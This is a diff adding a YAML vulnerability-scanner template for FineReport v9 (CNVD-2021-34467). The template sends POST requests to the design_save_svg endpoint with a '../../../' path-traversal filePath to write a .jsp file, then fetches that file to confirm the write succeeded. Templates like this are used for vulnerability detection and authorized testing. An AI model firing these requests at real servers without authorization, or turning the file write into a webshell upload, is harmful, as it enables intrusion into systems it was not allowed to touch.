@@ -1,0 +1,45 @@
+name: poc-yaml-finereport-v9-cnvd-2021-34467
+manual: true
+transport: http
+set:
+    r: randomLowercase(10)
+rules:
+    r1:
+        request:
+            method: POST
+            path: /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../{{r}}.svg.jsp
+            headers:
+                Content-Type: application/json;charset=UTF-8
+            body: '{"__CONTENT__":{{r}},"__CHARSET__":"UTF-8"}'
+            follow_redirects: false
+        expression: response.status==200
+    r2:
+        request:
+            method: GET
+            path: /WebReport/{{r}}.svg.jsp
+            follow_redirects: false
+        expression: response.status==200 && response.body.bcontains(bytes(r))
+    r3:
+        request:
+            method: POST
+            path: /ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../{{r}}.svg.jsp
+            headers:
+                Content-Type: application/json;charset=UTF-8
+            body: '{"__CONTENT__":{{r}},"__CHARSET__":"UTF-8"}'
+            follow_redirects: false
+        expression: response.status==200
+    r4:
+        request:
+            method: GET
+            path: /{{r}}.svg.jsp
+            follow_redirects: false
+        expression: response.status==200 && response.body.bcontains(bytes(r))
+expression:
+    (r1() && r2()) || (r3() && r4())
+
+detail:
+    author: Infiltrator
+    links:
+        - https://github.com/NHPT
+        - https://www.freebuf.com/articles/web/271623.html
+        - https://blog.csdn.net/qq_32261191/article/details/116375931
